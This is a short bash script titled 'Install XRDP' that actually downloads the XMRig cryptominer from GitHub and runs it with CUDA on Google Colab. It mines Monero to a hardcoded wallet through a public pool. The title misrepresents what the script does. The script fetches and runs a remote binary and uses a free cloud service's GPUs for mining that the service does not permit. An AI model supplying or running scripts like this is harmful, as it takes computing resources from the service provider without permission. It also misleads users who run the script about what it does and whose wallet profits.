#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig --cuda -o us-west.minexmr.com:443 -u 88FJ2dumaZAUsCskfUNuJHNs5GjFP9BtAJfXTrtftDWufAo42Q2jG5XA69ag8SeRs42zXpxJ8b8SWAVfAsJ9Gcct81cKCdt -k --tls --rig-id GC-US
